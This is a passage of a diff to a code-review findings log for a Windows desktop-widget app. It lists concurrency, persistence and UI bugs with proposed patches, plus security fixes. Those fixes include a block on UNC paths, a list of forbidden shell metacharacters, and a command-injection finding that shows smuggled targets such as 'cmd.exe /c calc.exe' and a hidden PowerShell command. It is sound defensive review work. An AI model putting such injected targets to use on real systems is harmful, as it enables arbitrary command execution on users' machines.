-+      setAlarmTriggered(true);
+ 
++    // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks and remote execution
++    let lower = trimmed.to_lowercase();
++    if lower.starts_with(r"\\") || lower.starts_with("//") {
++        return Err("UNC network paths are prohibited".to_string());
 +    }
-+  }, [digitalTime, alarmTime, isAlarmEnabled, alarmTriggered]);
-```
-
-### [MAJOR] [FIXED] X1-01 Permanent Tauri event listener leak on unmount during asynchronous listener setup in useConfig and useSpeedtest
-- **Status**: FIXED
-- **Where**: `src/hooks/useConfig.ts:68-82`, `src/hooks/useSpeedtest.ts:132-180`
-- **Source**: `r-review` (Cross-Cutting X1) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: robustness
-- **Scenario**: In React 18/19 (e.g. StrictMode mounting in dev or quick route navigation), components mount and immediately unmount. Because `listen(...)` from `@tauri-apps/api/event` is asynchronous, the unmount cleanup function runs before the promise resolves while `unlistenFn` / `unlistenProgress` / `unlistenConfig` are still `undefined`. When `listen()` resolves afterwards, the returned cleanup functions are assigned but never invoked, permanently leaking listener registrations in Tauri's event manager.
-- **Why**: `useConfig` and `useSpeedtest` do not maintain an `isDisposed` cancellation flag inside the resolution callback (unlike `useSystemMetrics.ts` which checks `if (isDisposed) unlisten();`).
-- **Fix**:
-```diff
---- a/src/hooks/useConfig.ts
-+++ b/src/hooks/useConfig.ts
-@@ -67,13 +67,20 @@ export function useConfig(): UseConfigReturn {
-+    let isDisposed = false;
-     let unlistenFn: (() => void) | undefined;
-     void import("@tauri-apps/api/event").then(({ listen }) => {
-+      if (isDisposed) return;
-       void listen<AppConfig>("config-changed", (event) => {
-+        if (isDisposed) return;
-         if (event.payload) {
-           setConfig(event.payload);
-         }
-       }).then((unlisten) => {
--        unlistenFn = unlisten;
-+        if (isDisposed) {
-+          unlisten();
-+        } else {
-+          unlistenFn = unlisten;
-+        }
-       });
-     });
-
-     return () => {
-+      isDisposed = true;
-       if (unlistenFn) {
-         unlistenFn();
-       }
-     };
-```
-
-### [MAJOR] [FIXED] X1-02 Stale config ref desynchronization causes subsequent writes to revert external changes
-- **Status**: FIXED
-- **Where**: `src/hooks/useConfig.ts:69-75`, `src/hooks/useConfig.ts:114-116`
-- **Source**: `r-review` (Cross-Cutting X1) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: When configuration changes are made from outside the component (e.g. user toggles Lock Positions or Widget Visibility via the Windows tray menu, or moves a widget in another independent window), the `"config-changed"` event handler updates React state (`setConfig(event.payload)`) but omits updating `latestConfigRef.current`. When the user later drags a widget or toggles a setting in this component, `updateConfig` or `updateWidgetPlacement` reads `latestConfigRef.current` (which is stale), overwriting and discarding the external changes before saving back to disk.
-- **Why**: The `"config-changed"` event listener updates `config` via `setConfig` but omits `latestConfigRef.current = event.payload`.
-- **Fix**:
-```diff
---- a/src/hooks/useConfig.ts
-+++ b/src/hooks/useConfig.ts
-@@ -69,6 +69,7 @@ export function useConfig(): UseConfigReturn {
-       void listen<AppConfig>("config-changed", (event) => {
-         if (event.payload) {
-+          latestConfigRef.current = event.payload;
-           setConfig(event.payload);
-         }
-       })
-```
-
-### [MAJOR] [FIXED] X1-03 Shallow object spread in useCalendar config sync resurrects deleted calendar date entries
-- **Status**: FIXED
-- **Where**: `src/hooks/useCalendar.ts:68-75`
-- **Source**: `r-review` (Cross-Cutting X1) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: When all notes for a specific date are removed, backend `remove_note_from_map` deletes the date key from `config.calendar_events`. When the subsequent `config-changed` event propagates to `useCalendar`, the sync effect runs `setEvents((prev) => ({ ...prev, ...config.calendar_events }))`. Because object spread cannot delete keys that exist in `prev`, the deleted date key remains in the component state, causing removed calendar notes to reappear.
-- **Why**: Synchronizing state via `{ ...prev, ...config.calendar_events }` performs a key-additive merge rather than a proper reconciliation of deleted keys.
-- **Fix**:
-```diff
---- a/src/hooks/useCalendar.ts
-+++ b/src/hooks/useCalendar.ts
-@@ -68,9 +68,6 @@ export function useCalendar(options?: UseCalendarOptions): UseCalendarReturn {
-   useEffect(() => {
-     if (!options?.initialEvents && config.calendar_events) {
--      setEvents((prev) => ({
--        ...prev,
--        ...config.calendar_events,
--      }));
-+      setEvents(config.calendar_events);
-     }
-   }, [config.calendar_events, options?.initialEvents]);
-```
-
-### [MAJOR] [FIXED] X1-04 Synchronous filesystem and registry game scanning executed on Tokio async worker thread
-- **Status**: FIXED
-- **Where**: `src-tauri/src/launcher/mod.rs:488-496`
-- **Source**: `r-review` (Cross-Cutting X1) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: performance
-- **Scenario**: When a user opens or refreshes the Launcher widget, `scan_installed_games` is invoked. Although declared as an `async fn` command, it calls `scan_steam_games()` and `scan_epic_games()` directly on Tokio's async worker thread without `tokio::task::spawn_blocking`. These functions perform synchronous directory traversal across multiple candidate roots, parse `.vdf` text files, enumerate `appmanifest` files, and synchronously read and base64-encode icon images from disk, blocking the Tokio worker thread for hundreds of milliseconds.
-- **Why**: Disk and registry I/O operations in `scan_installed_games` were not wrapped in `tokio::task::spawn_blocking`.
-- **Fix**:
-```diff
---- a/src-tauri/src/launcher/mod.rs
-+++ b/src-tauri/src/launcher/mod.rs
-@@ -488,9 +488,14 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
- #[tauri::command]
- #[specta::specta]
- pub async fn scan_installed_games() -> Result<Vec<LauncherItem>, String> {
--    let mut games = scan_steam_games();
--    let mut epic_games = scan_epic_games();
--    games.append(&mut epic_games);
--
--    // Sort alphabetically by name
--    games.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
--    Ok(games)
-+    tokio::task::spawn_blocking(|| {
-+        let mut games = scan_steam_games();
-+        let mut epic_games = scan_epic_games();
-+        games.append(&mut epic_games);
-+        games.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
-+        games
-+    })
-+    .await
-+    .map_err(|e| format!("Game scan task join failed: {}", e))
- }
-```
-
-### [MAJOR] [FIXED] X1-05 Synchronous 200ms thread sleep on Tokio worker thread during uninitialized sysinfo fallback
-- **Status**: FIXED
-- **Where**: `src-tauri/src/sysinfo/mod.rs:28-29`, `src-tauri/src/sysinfo/collector.rs:29`
-- **Source**: `r-review` (Cross-Cutting X1) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: performance
-- **Scenario**: If the Resources widget invokes `get_system_metrics` before the background sysinfo worker completes its first cycle (`timestamp_ms == 0`), the command creates a fallback `MetricsCollector::new()`. Its constructor calls `std::thread::sleep(Duration::from_millis(200))` synchronously. Because `get_system_metrics` is an async command running directly on a Tokio worker thread, this halts the worker thread for 200ms, stalling other concurrent async operations.
-- **Why**: `get_system_metrics` calls the blocking constructor `MetricsCollector::new()` directly in an async command body without dispatching to `spawn_blocking`.
-- **Fix**:
-```diff
---- a/src-tauri/src/sysinfo/mod.rs
-+++ b/src-tauri/src/sysinfo/mod.rs
-@@ -28,3 +28,8 @@ pub async fn get_system_metrics<R: Runtime>(app: AppHandle<R>) -> Result<System
--    let mut collector = MetricsCollector::new();
--    Ok(collector.collect_metrics(true))
-+    tokio::task::spawn_blocking(|| {
-+        let mut collector = MetricsCollector::new();
-+        collector.collect_metrics(true)
-+    })
-+    .await
-+    .map_err(|e| format!("Metrics fallback collection failed: {}", e))
- }
-```
-
-### [MAJOR] [FIXED] X1-06 Concurrent window creation race condition in duplicate_quick_settings_widget
-- **Status**: FIXED
-- **Where**: `src-tauri/src/lib.rs:382-385`, `src-tauri/src/lib.rs:577-586`
-- **Source**: `r-review` (Cross-Cutting X1) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: concurrency
-- **Scenario**: When duplicating a quick settings widget, `duplicate_quick_settings_widget` emits `"config-changed"` and then awaits `open_widget_window(app.clone(), new_id.clone())`. Concurrently, the backend listener for `"config-changed"` spawns `sync_widget_windows`, which iterates `config.widgets` and immediately calls `open_widget_window` for the exact same `new_id`. Both concurrent executions check for the window before either has finished building it, resulting in both attempting to construct a window with the same label (`widget_quick_settings_<ts>`) and triggering a Tauri window creation failure.
-- **Why**: `open_widget_window` is called directly after emitting `"config-changed"`, which itself triggers `sync_widget_windows` asynchronously.
-- **Fix**:
-```diff
---- a/src-tauri/src/lib.rs
-+++ b/src-tauri/src/lib.rs
-@@ -382,3 +382,1 @@ pub mod integration {
-             let _ = app.emit("config-changed", &config);
--
--            open_widget_window(app.clone(), new_id.clone()).await?;
--
-             Ok(new_id)
-```
-
-### [MAJOR] [FIXED] X2-01 Missing Backdrop Blur on Fluent Acrylic Surfaces Destroys Native Windows 11 Material Depth
-- **Status**: FIXED
-- **Where**: `src/styles/fluent.css:56-58`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: visual / design-token
-- **Scenario**: When widgets are positioned over the Windows desktop wallpaper (as shown in the provided screenshot against the dark purple ribbon wallpaper), the widget containers appear as flat, semi-opaque dark boxes rather than authentic Windows 11 Desktop Acrylic / Mica material with blurred background refraction.
-- **Why**: `.fluent-acrylic` defines only `background-color: var(--fluent-acrylic-bg)` without any `backdrop-filter: blur(20px) saturate(180%)` or `-webkit-backdrop-filter`. The default dark opacity `rgba(28, 28, 30, 0.58)` without background blur results in low contrast and lacks the optical depth characteristic of Windows 11 Fluent surfaces.
-- **Fix**:
-```diff
- /* Acrylic style class for desktop widget containers */
- .fluent-acrylic {
-   background-color: var(--fluent-acrylic-bg);
-+  backdrop-filter: blur(20px) saturate(180%);
-+  -webkit-backdrop-filter: blur(20px) saturate(180%);
- }
++
+     // Disallow shell operators and chaining characters in paths
+     let dangerous_path_chars = ['|', ';', '>', '<', '"', '`'];
+     for dc in dangerous_path_chars {
 ```
 
 ---
 
-### [MINOR] [OPEN] M1-08 Window Creation Lacks Initial Position and Hidden Flag, Causing Visible Cascade Pop
-- **Status**: OPEN
-- **Where**: `src-tauri/src/lib.rs:87-98`
-- **Source**: `r-review` (2026-10-26)
+### [CRITICAL] [FIXED] X-fluent-ux-security-02 Command and Argument Injection via Space-Delimited Executable Targets in `execute_quick_action`
+- **Status**: FIXED
+- **Where**: `src-tauri/src/actions/mod.rs:43-59`, `src-tauri/src/actions/mod.rs:98-107`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: robustness
-- **Scenario**: When a widget window is opened, it flashes briefly at Windows' default cascade coordinates (or top-left origin) before teleporting to its configured `placement.logical_x` and `logical_y`.
-- **Why**: `WebviewWindowBuilder::new` creates the window with default visibility and omitted coordinates, deferring placement to `setup_widget_window` after the window has already been rendered on screen.
+- **Category**: security
+- **Scenario**: A user or manipulated configuration passes a custom action target such as `custom_target = "cmd.exe /c calc.exe"` or `"powershell.exe -WindowStyle Hidden -Command ..."`.
+- **Why**: `validate_custom_target` only blocks four metacharacters (`&`, `|`, `;`, `` ` ``), but does not verify that the executable path exists, is an allowed executable extension, or lacks argument delimiters. When `ResolvedAction::Executable` is passed to `launch_shell_execute`, `ShellExecuteW` is called with `lpFile = custom_target` and `lpParameters = NULL`. Under Win32 `ShellExecute` rules, if `lpFile` is unquoted and contains spaces, the first token is treated as the executable name and trailing tokens are passed as parameters, enabling arbitrary shell command execution.
 - **Fix**:
 ```diff
-         let window = tauri::WebviewWindowBuilder::new(
-             &app,
-             &label,
-             tauri::WebviewUrl::App(format!("index.html?widget={}", widget_id).into()),
-         )
-         .title(format!("vvidget - {}", widget_id))
-+        .position(placement.logical_x, placement.logical_y)
-+        .visible(false)
-         .inner_size(placement.logical_width, placement.logical_height)
+--- a/src-tauri/src/actions/mod.rs
++++ b/src-tauri/src/actions/mod.rs
+@@ -49,6 +49,15 @@ fn validate_custom_target(target: &str) -> Result<(), String> {
+     if target.len() > 2048 {
+         return Err("Target exceeds maximum allowed length (2048 chars)".to_string());
+     }
++    // Prohibit executable command-line parameter injection when not a URI scheme
++    if !is_uri_target(target) {
++        if target.contains(' ') {
++            return Err("Custom executable paths cannot contain unquoted arguments".to_string());
++        }
++        let path = std::path::Path::new(target);
++        if !path.is_absolute() || !path.is_file() {
++            return Err("Custom executable target must be an existing absolute file".to_string());
++        }
++    }
+     // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks
+     if target.starts_with(r"\\") || target.starts_with("//") {
+         return Err("UNC network paths are prohibited".to_string());
 ```
 
-### [MINOR] [OPEN] M1-09 Tray Menu Checkboxes Fail to Update Checked State on Toggle
+---
+
+### [MAJOR] [OPEN] M1-02 Race Condition in `hide_window` Causes Shell Subclass to Veto Programmatic Hide
 - **Status**: OPEN
-- **Where**: `src-tauri/src/tray/mod.rs:250-258` and `src-tauri/src/tray/mod.rs:268-313`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/window/win32.rs:119-130`, `src-tauri/src/window/win32.rs:456-462`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: bug
-- **Scenario**: Clicking "Lock Positions" or any widget item in the system tray menu toggles the backend setting, but the checkmark icon in the tray context menu never updates, misleading users regarding active status.
-- **Why**: Tauri 2 `CheckMenuItem` items in Windows tray menus do not automatically toggle visual checked state on click event; explicit `.set_checked()` calls are required (as implemented for `layout_independent` / `layout_docked`), but omitted for `toggle_lock` and widget toggles.
+- **Scenario**: Application switches layout mode or hides the main window via `hide_window(&main)` from an async runtime task.
+- **Why**: `hide_window` sets `set_window_allow_hide(hwnd, true)`, triggers `window.hide()`, and immediately sets `set_window_allow_hide(hwnd, false)` on the caller thread. Because `window.hide()` dispatches asynchronously across threads to the Win32 UI message queue, `set_window_allow_hide(false)` executes before `WM_SHOWWINDOW` is dispatched. When `widget_subclass_proc` receives `WM_SHOWWINDOW`, `is_window_allow_hide` is already `false`, vetoing the hide with `return LRESULT(0)` and leaving the window permanently visible.
 - **Fix**:
 ```diff
-                 "toggle_lock" => {
-+                    let _ = toggle_lock.set_checked(!toggle_lock.is_checked().unwrap_or(false));
-                     let handle = app_handle.clone();
-```
-
-### [MINOR] [OPEN] M1-10 `WindowManager::locked` Flag Ignored in Native Win32 Drag Path
-- **Status**: OPEN
-- **Where**: `src-tauri/src/window/win32.rs:509-516` and `src-tauri/src/window/manager.rs:84-90`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: MEDIUM
-- **Category**: contract
-- **Scenario**: When the user locks positions in vvidget, frontend drag handles are disabled, but widgets can still be moved natively via Win32 messages or OS window movement.
-- **Why**: `WindowManager::locked` is stored in an atomic variable that is never checked in `widget_subclass_proc` during `WM_MOVING` or `WM_WINDOWPOSCHANGING`.
-- **Fix**:
-```diff
-         WM_MOVING => {
-+            if is_snap_locked() {
-+                return LRESULT(0);
-+            }
-             let p_rect = lparam.0 as *mut RECT;
-```
-
-### [MINOR] [OPEN] M1-11 `WM_NCDESTROY` Leaves Stale Widget Entries in `WindowManager::widgets` (lens: F1b)
-- **Status**: OPEN
-- **Where**: `src-tauri/src/window/win32.rs:580-585`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: MEDIUM
-- **Category**: robustness
-- **Scenario**: If a widget window is closed by external process termination or an unhandled webview crash, `WM_NCDESTROY` unregisters the HWND from `TRACKED_WINDOWS` but leaves the record in `WindowManager::widgets`. `get_active_widget_rects` continues to return phantom rectangles for dead windows.
-- **Why**: `WM_NCDESTROY` cleans up subclass hooks and `TRACKED_WINDOWS`, but lacks a bridge back to `WindowManager` to remove the widget from its internal map.
-- **Fix**:
-```diff
-         WM_NCDESTROY => {
-             unregister_tracked_window(hwnd.0 as isize);
-             set_window_allow_hide(hwnd.0 as isize, false);
-+            dispatch_window_destroyed(hwnd.0 as isize);
-             let _ = RemoveWindowSubclass(hwnd, Some(widget_subclass_proc), uidsubclass);
+--- a/src-tauri/src/window/win32.rs
++++ b/src-tauri/src/window/win32.rs
+@@ -123,10 +123,6 @@ pub fn hide_window<R: tauri::Runtime>(window: &tauri::WebviewWindow<R>) -> Resul
+     if let Ok(hwnd) = window.hwnd() {
+         set_window_allow_hide(hwnd.0 as isize, true);
+     }
+-    let res = window.hide();
+-    #[cfg(windows)]
+-    if let Ok(hwnd) = window.hwnd() {
+-        set_window_allow_hide(hwnd.0 as isize, false);
+-    }
+-    res
++    window.hide()
+ }
+@@ -457,7 +453,11 @@ unsafe extern "system" fn widget_subclass_proc(
+         WM_SHOWWINDOW => {
+-            if wparam.0 == 0 && !is_window_allow_hide(hwnd.0 as isize) {
+-                // Veto the hide request from the Windows Shell on Win+D / Show Desktop
+-                return LRESULT(0);
++            if wparam.0 == 0 {
++                if is_window_allow_hide(hwnd.0 as isize) {
++                    set_window_allow_hide(hwnd.0 as isize, false);
++                } else {
++                    // Veto the hide request from the Windows Shell on Win+D / Show Desktop
++                    return LRESULT(0);
++                }
+             }
              DefSubclassProc(hwnd, umsg, wparam, lparam)
          }
 ```
 
-### [MINOR] [OPEN] M2-07 Date Whitespace Divergence in `remove_calendar_note` and `toggle_calendar_note` Prevents Note Deletion/Toggle
+---
+
+### [MAJOR] [OPEN] M1-03 Dragged Non-Starter Widgets Silently Drop Position Persistence in Config
 - **Status**: OPEN
-- **Where**: `src-tauri/src/calendar/mod.rs:41-50`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/window/manager.rs:177-185`, `src-tauri/src/lib.rs:133-143`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: bug
-- **Scenario**: While `add_note_to_map` trims the date parameter before inserting into the `HashMap` (`date_trimmed = date.trim()`), `remove_note_from_map` and `toggle_note_in_map` use `events.get_mut(date)` directly without trimming. If a date string contains leading or trailing whitespace (e.g. `"2026-10-26 "`), the lookup fails, and the note cannot be removed or toggled.
-- **Why**: Inconsistent normalization between insertion (trimmed) and query/deletion (untrimmed).
+- **Scenario**: User toggles on any non-starter widget (e.g. `speedtest`, `launcher`, `calendar`, `battery`, `clock`, `bluetooth`, `quick_settings`) and drags it to a new desktop position.
+- **Why**: `AppConfig::default()` only creates Map entries for `resources`, `spotify`, and `weather`. `handle_window_moved` and `save_widget_position` look up `config.widgets.get_mut(&widget_id)`. If the key does not already exist, `get_mut` returns `None`, silently discarding the coordinate update without inserting a `WidgetPlacement`, so the moved position is never saved to disk.
 - **Fix**:
 ```diff
---- a/src-tauri/src/calendar/mod.rs
-+++ b/src-tauri/src/calendar/mod.rs
-@@ -43,3 +43,3 @@ pub fn remove_note_from_map(
- ) {
--    if let Some(notes) = events.get_mut(date) {
-+    if let Some(notes) = events.get_mut(date.trim()) {
-         notes.retain(|n| n.id != note_id);
-@@ -57,3 +57,3 @@ pub fn toggle_note_in_map(
- ) {
--    if let Some(notes) = events.get_mut(date) {
-+    if let Some(notes) = events.get_mut(date.trim()) {
-         if let Some(note) = notes.iter_mut().find(|n| n.id == note_id) {
+--- a/src-tauri/src/window/manager.rs
++++ b/src-tauri/src/window/manager.rs
+@@ -178,13 +178,16 @@ impl WindowManager {
+                 tauri::async_runtime::spawn(async move {
+                     let mut config = cm.get_config().await;
+-                    if let Some(placement) = config.widgets.get_mut(&widget_id) {
+-                        placement.logical_x = logical_x;
+-                        placement.logical_y = logical_y;
+-                        placement.logical_width = logical_width;
+-                        placement.logical_height = logical_height;
+-                        placement.scale_factor = scale;
+-                    }
++                    let placement = config.widgets.entry(widget_id.clone()).or_insert_with(|| crate::config::WidgetPlacement {
++                        id: widget_id.clone(),
++                        visible: true,
++                        logical_x,
++                        logical_y,
++                        logical_width,
++                        logical_height,
++                        scale_factor: scale,
++                        monitor_id: None,
++                    });
++                    placement.logical_x = logical_x;
++                    placement.logical_y = logical_y;
++                    placement.logical_width = logical_width;
++                    placement.logical_height = logical_height;
++                    placement.scale_factor = scale;
+                     if let Err(e) = cm.save_debounced(config).await {
+--- a/src-tauri/src/lib.rs
++++ b/src-tauri/src/lib.rs
+@@ -133,12 +133,16 @@ pub mod integration {
+         if let Some(cm) = app.try_state::<ConfigManager>() {
+             let mut config = cm.get_config().await;
+-            let (w, h) = if let Some(placement) = config.widgets.get_mut(&widget_id) {
+-                placement.logical_x = logical_x;
+-                placement.logical_y = logical_y;
+-                (placement.logical_width, placement.logical_height)
+-            } else {
+-                (320.0, 240.0)
+-            };
++            let placement = config.widgets.entry(widget_id.clone()).or_insert_with(|| crate::config::WidgetPlacement {
++                id: widget_id.clone(),
++                visible: true,
++                logical_x,
++                logical_y,
++                logical_width: 320.0,
++                logical_height: 240.0,
++                scale_factor: 1.0,
++                monitor_id: None,
++            });
++            placement.logical_x = logical_x;
++            placement.logical_y = logical_y;
++            let (w, h) = (placement.logical_width, placement.logical_height);
 ```
 
-### [MINOR] [OPEN] M2-08 Upload Benchmark Progress Freeze and Low Bandwidth Timeout Failure
+---
+
+### [MAJOR] [OPEN] M1-04 WindowManager Stale Scale Factor Inflates Logical Bounds Across Monitor DPI Boundaries
 - **Status**: OPEN
-- **Where**: `src-tauri/src/speedtest/mod.rs:173-206`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/window/manager.rs:165-171`, `src-tauri/src/window/win32.rs:483-540`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: robustness
-- **Scenario**: In `run_upload_phase`, the 3.5 MB buffer is dispatched in a single `body(payload).send().await` call. During upload (which can take 15-20 seconds on modest connections), progress stays frozen at 0.1 with zero interim progress events. Furthermore, on upload speeds below ~1.12 Mbps, the 25-second overall timeout aborts the entire test, discarding already completed ping and download measurements.
-- **Why**: Upload phase does not stream chunks with progress emissions, and treats upload failure as fatal to the entire benchmark pipeline.
+- **Category**: bug
+- **Scenario**: User drags a widget from a standard DPI display (100% scale factor 1.0) onto a high-DPI display (200% scale factor 2.0).
+- **Why**: `WidgetWindowInfo.scale_factor` is cached once at initial window setup and never updated when crossing monitors. In `handle_window_moved`, the new physical pixel rect (e.g. 640x480) is divided by the stale scale factor (1.0 instead of 2.0), storing inflated logical width and height (640x480) into config and causing the window size to double on restart.
 - **Fix**:
 ```diff
---- a/src-tauri/src/speedtest/mod.rs
-+++ b/src-tauri/src/speedtest/mod.rs
-@@ -282,18 +282,10 @@ pub async fn run_speedtest<R: Runtime>(
-     // Phase 3: Upload Speed
--    let upload_mbps = match run_upload_phase(&client, &app, CF_SPEEDTEST_UP_URL, ping_ms, jitter_ms, download_mbps).await {
-+    let upload_mbps = match run_upload_phase(&client, &app, CF_SPEEDTEST_UP_URL, ping_ms, jitter_ms, download_mbps).await
-+    {
-         Ok(mbps) => mbps,
-         Err(e) => {
--            let _ = app.emit(
--                "speedtest-progress",
--                SpeedtestProgress {
--                    stage: "error".to_string(),
--                    progress: 0.0,
--                    current_mbps: 0.0,
--                    ping_ms: Some(ping_ms),
--                    jitter_ms: Some(jitter_ms),
--                    download_mbps: Some(download_mbps),
--                    upload_mbps: None,
--                    error: Some(e.clone()),
--                },
--            );
--            return Err(e);
-+            log::warn!("Speedtest upload phase failed: {}", e);
-+            0.0
-         }
-     };
+--- a/src-tauri/src/window/manager.rs
++++ b/src-tauri/src/window/manager.rs
+@@ -166,7 +166,13 @@ impl WindowManager {
+     pub fn handle_window_moved(&self, hwnd: isize, rect: Rect) {
+         if let Some(info) = self.find_widget_by_hwnd(hwnd) {
+-            let scale = if info.scale_factor > 0.0 { info.scale_factor } else { 1.0 };
++            #[cfg(windows)]
++            let current_scale = unsafe {
++                let dpi = windows::Win32::UI::HiDpi::GetDpiForWindow(windows::Win32::Foundation::HWND(hwnd as *mut _));
++                if dpi > 0 { dpi as f64 / 96.0 } else { info.scale_factor }
++            };
++            #[cfg(not(windows))]
++            let current_scale = info.scale_factor;
++            let scale = if current_scale > 0.0 { current_scale } else { 1.0 };
+             let logical_x = (rect.left as f64) / scale;
+             let logical_y = (rect.top as f64) / scale;
 ```
 
-### [MINOR] [OPEN] M2-09 Debounced Config Drops Unsaved Changes on Application Termination
+---
+
+### [MAJOR] [OPEN] M1-05 WindowManager Lock State Disconnected from Win32 Subclass Allowing Drag When Locked
 - **Status**: OPEN
-- **Where**: `src-tauri/src/config/storage.rs:287-318`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: MEDIUM
-- **Category**: robustness
-- **Scenario**: When a user drags a widget, `save_config` dispatches `save_debounced`, resetting the 500ms timer. If the application is closed within 500ms of the move, the spawned debounce task is aborted by process exit without flushing `is_dirty` config to disk, silently losing the latest widget positions.
-- **Why**: `ConfigManager` lacks a flush method or lifecycle hook to save dirty configuration on window close or process termination.
+- **Where**: `src-tauri/src/window/manager.rs:88-90`, `src-tauri/src/window/win32.rs:472-540`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: User sets "Lock Positions" to true via the tray menu or Settings. User or accidental mouse drag moves a widget window.
+- **Why**: `WindowManager::set_locked` updates an internal atomic boolean, but `widget_subclass_proc` in `win32.rs` never checks this lock state. During `WM_MOVING` and `WM_EXITSIZEMOVE`, magnetic snapping, `SetWindowPos`, and config persistence continue to execute normally, bypassing the lock.
+- **Fix**:
+```diff
+-        WM_SYSCOMMAND => {
+-            if (wparam.0 as u32) & 0xFFF0 == SC_MINIMIZE {
+-                return LRESULT(0);
+-            }
+-            DefSubclassProc(hwnd, umsg, wparam, lparam)
+-        }
++        WM_SYSCOMMAND => {
++            let cmd = (wparam.0 as u32) & 0xFFF0;
++            if cmd == SC_MINIMIZE || (cmd == SC_MOVE && is_positions_locked()) {
++                return LRESULT(0);
++            }
++            DefSubclassProc(hwnd, umsg, wparam, lparam)
++        }
+```
+
+---
+
+### [MAJOR] [FIXED] M2-01 Read-Modify-Write Race Condition in `set_widgets_locked` and `set_autostart` Causes Lost Updates
+- **Status**: FIXED
+- **Where**: `src-tauri/src/config/mod.rs:70-82`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: When a user locks widget positions (`set_widgets_locked`) or configures autostart (`set_autostart`), the backend fetches `manager.get_config().await`, updates only that single field in its local clone, and calls `save_config_immediate` / `save_immediate(config)`. If a concurrent operation (such as adding a calendar note, saving a speedtest result, or moving another widget) persists changes via `update_config` between `get_config()` and `save_immediate()`, `save_immediate` blindly overwrites `current_config` and `config.json` with its stale snapshot, permanently discarding the other mutations.
+- **Why**: `set_widgets_locked` and `set_autostart` bypass `ConfigManager::update_config` and execute an uncoordinated read-modify-write sequence across asynchronous boundaries.
+- **Fix**:
+```diff
+--- a/src-tauri/src/config/mod.rs
++++ b/src-tauri/src/config/mod.rs
+@@ -69,14 +69,18 @@ pub async fn set_widgets_locked<R: Runtime>(
+     app: AppHandle<R>,
+     locked: bool,
+ ) -> Result<(), String> {
+-    let mut config = if let Some(manager) = app.try_state::<ConfigManager>() {
+-        manager.get_config().await
++    if let Some(win_mgr) = app.try_state::<crate::window::WindowManager>() {
++        win_mgr.set_locked(locked);
++    }
++
++    if let Some(manager) = app.try_state::<ConfigManager>() {
++        let snapshot = manager
++            .update_config(|config| {
++                config.lock_positions = locked;
++                Ok(config.clone())
++            })
++            .await?;
++        let _ = app.emit("config-changed", &snapshot);
++        Ok(())
+     } else {
+-        load_or_recover_config(&resolve_config_path()).0
+-    };
+-
+-    if let Some(win_mgr) = app.try_state::<crate::window::WindowManager>() {
+-        win_mgr.set_locked(locked);
+-    }
+-
+-    config.lock_positions = locked;
+-    save_config_immediate(app, config).await
++        let mut config = load_or_recover_config(&resolve_config_path()).0;
++        config.lock_positions = locked;
++        save_config_immediate(app, config).await
++    }
+ }
+@@ -109,7 +113,12 @@ pub async fn set_autostart<R: Runtime>(app: AppHandle<R>, enabled: bool) -> Res
+     // Update config in state as well
+     if let Some(manager) = app.try_state::<ConfigManager>() {
+-        let mut config = manager.get_config().await;
+-        if config.auto_start != enabled {
+-            config.auto_start = enabled;
+-            let _ = manager.save_immediate(config.clone()).await;
+-            let _ = app.emit("config-changed", &config);
+-        }
++        let snapshot = manager
++            .update_config(|config| {
++                config.auto_start = enabled;
++                Ok(config.clone())
++            })
++            .await?;
++        let _ = app.emit("config-changed", &snapshot);
+     }
+```
+
+### [MAJOR] [FIXED] M2-02 Unsynchronized Concurrent Disk Writes Between `save_immediate` and Background Debounce Task
+- **Status**: FIXED
+- **Where**: `src-tauri/src/config/storage.rs:310-315`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: concurrency
+- **Scenario**: When the 500ms debounce timer pops, it dispatches `save_config_atomic(&path, &config_to_save)` on a blocking thread via `tokio::task::spawn_blocking`. If `save_immediate` or `update_config` is called at the same moment, `save_immediate` drops its in-memory write lock and immediately spawns another blocking task to write `config.json`. Both blocking tasks attempt concurrent atomic renames over `config.json`. On Windows NTFS, this triggers transient sharing violations (`ERROR_SHARING_VIOLATION`), or Thread 1's older debounced frame finishes second and overwrites the newer data persisted by `save_immediate`.
+- **Why**: Disk persistence tasks in `ConfigManager` are dispatched into `spawn_blocking` without a dedicated mutex or channel to serialize physical filesystem operations.
 - **Fix**:
 ```diff
 --- a/src-tauri/src/config/storage.rs
 +++ b/src-tauri/src/config/storage.rs
-@@ -367,2 +367,11 @@ impl ConfigManager {
-     }
-+
-+    pub async fn flush(&self) -> Result<(), String> {
-+        if self.is_dirty.swap(false, Ordering::SeqCst) {
-+            let config = self.current_config.read().await.clone();
-+            let path = self.config_path.clone();
-+            tokio::task::spawn_blocking(move || save_config_atomic(&path, &config))
-+                .await
-+                .map_err(|e| format!("Flush error: {e}"))?
-         } else {
-             Ok(())
-         }
-     }
+@@ -271,2 +271,3 @@ pub struct ConfigManager {
+     is_dirty: Arc<AtomicBool>,
++    persist_lock: Arc<tokio::sync::Mutex<()>>,
